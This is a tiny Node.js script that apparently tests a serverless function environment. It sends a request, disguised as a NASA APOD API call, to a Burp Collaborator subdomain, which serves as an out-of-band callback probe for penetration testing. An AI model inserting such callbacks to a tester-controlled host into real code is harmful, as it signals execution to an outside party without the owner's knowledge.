var request=require("/catalyst/functions/Root/node_modules/requests");
request('http://n5t6dff5n39mlth4prdsrd0o5fb5zu.burpcollaborator.net/apod?api_key=eeww', { json: true }, (err, ress, body) => {
  if (err) { return console.log(err); }
  //console.log(body.url);
  //console.log(body.explanation);
});
